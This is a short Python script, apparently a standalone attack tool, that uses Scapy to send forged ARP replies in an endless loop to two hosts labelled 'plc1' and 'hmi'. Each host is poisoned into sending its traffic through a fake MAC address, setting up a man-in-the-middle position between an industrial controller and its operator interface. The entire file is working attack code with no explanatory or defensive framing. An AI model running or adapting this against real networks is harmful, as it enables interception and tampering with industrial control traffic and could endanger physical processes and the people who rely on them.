
from scapy.all import *
import time

while True:
    E = Ether(dst = '00:1D:9C:C7:B0:10', src = 'AA:AA:AA:AA:AA:AA')  
    A = ARP(op = 2, hwsrc = 'AA:AA:AA:AA:AA:AA', psrc = '192.168.1.20', hwdst = '00:1D:9C:C7:B0:10', pdst = '192.168.1.10')  
    
    print(f"send a packet to plc1")
    pkt = E/A  
    sendp(pkt)

    
    E1 = Ether(dst = '00:1D:9C:C8:BC:20', src = 'AA:AA:AA:AA:AA:AA')  
    A1 = ARP(op = 2, hwsrc = 'AA:AA:AA:AA:AA:AA', psrc = '192.168.1.10', hwdst = '00:1D:9C:C8:BC:20', pdst = '192.168.1.20')  
    
    pkt1 = E1/A1 
    print(f"send a packet to hmi")
    sendp(pkt1)
    

    time.sleep(1)